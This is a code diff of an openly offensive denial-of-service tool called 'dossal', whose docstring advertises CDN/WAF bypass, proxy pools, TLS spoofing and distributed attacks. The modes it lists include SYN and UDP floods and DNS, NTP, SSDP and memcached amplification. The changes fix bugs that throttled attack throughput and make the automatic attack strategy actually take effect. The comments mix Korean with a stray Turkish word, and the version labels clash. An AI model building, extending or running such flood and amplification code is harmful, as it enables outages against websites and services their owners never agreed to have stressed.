@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v12.1 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+dossal v12.8 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
 v5.0: proxy pool, TLS spoof, origin discovery
 v5.2: adaptive attack (RPS auto-adjust based on response time)
 v6.0: distributed attack (coordinator + worker, UDP control channel)
@@ -877,7 +877,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "3.16"
+VERSION = "12.8"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -1249,7 +1249,9 @@ async def https_worker(name, url, stats, duration, stop, payload_size=0):
             stats.requests += 1
             stats.bytes += len(resp)
         except (asyncio.TimeoutError, Exception):
-            stats.errors += 1
+            # v12.9: stop 후(지정 시간 종료)의 예외는 정규 종료 — 에러로 세지 않음
+            if not stop.is_set():
+                stats.errors += 1
             break
     if writer.transport:
         writer.transport.abort()
@@ -1574,8 +1576,12 @@ async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
                                 h2_429 += 1
                                 break
         except Exception as e:
-            stats.errors += 1
             error = e
+            # v12.9: stop 후(지정 시간 종료)의 예외는 정규 종료 — 에러로 세지 않음
+            # (ConnectionResetError 등: 공격 종료와 동시에 서버가 RST gönder는 것)
+            if not stop.is_set():
+                stats.errors += 1
+                print(f"[h2-worker] error: {type(e).__name__}: {e}", file=sys.stderr)
             break
     if h2_429 > 0:
         print(f"[h2] {h2_429} 429 responses received", file=sys.stderr)
@@ -3184,13 +3190,17 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_
         await asyncio.sleep(duration); stop.set()
     task = asyncio.create_task(finish())
     workers = []
-    # Split process budget among L4 multiproc modes
+    # v12.9: 멀티모드 프로세스 예산 — 각 모드에 독립적으로 고정
+    # 이전 버그: _UDP_NPROCS[0]을 nprocs//n_l4로 줄여서 2개 모드 조합 시
+    # 두 모드 모두 절반 프로세스로 spawn 경쟁 → RPS 40배 감소
+    # 수정: L7 단일 루프 모드(http/https/h2/http2)와 함께 하는 경우에만
+    # 멀티프로세스 모드가 전체 예산을 사용
     MULTIPROC_ALL = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'grpcmp', 'httpsmp'}
     l4_modes = [m for m in modes if m in MULTIPROC_ALL]
     n_l4 = len(l4_modes)
     if n_l4 > 1:
-        # Distribute _UDP_NPROCS across multiproc modes
-        per_mode = max(1, _UDP_NPROCS[0] // n_l4)
+        # 여러 멀티프로세스 모드: 균등 분배 (최소 2, 최대 절반)
+        per_mode = max(2, min(_UDP_NPROCS[0] // n_l4, _UDP_NPROCS[0] // 2))
         _UDP_NPROCS[0] = per_mode
     
     MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'h3mp', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'}
@@ -3560,7 +3570,9 @@ examples:
         
         # 4. Start attack (use strategy as modes)
         print("[auto-full] 4/5: 공격 시작...", file=sys.stderr)
-        modes = strategy
+        # v12.8 버그 수정: strategy를 args.mode에 실제로 적용
+        # (이전: throwaway `modes` 변수만 생성, args.mode은 기본값 'http' 유지)
+        args.mode = ",".join(strategy)
         # Enable adaptive mode
         _ADAPTIVE[0] = True
         print("[auto-full] 5/5: 적응형 공격 ON", file=sys.stderr)
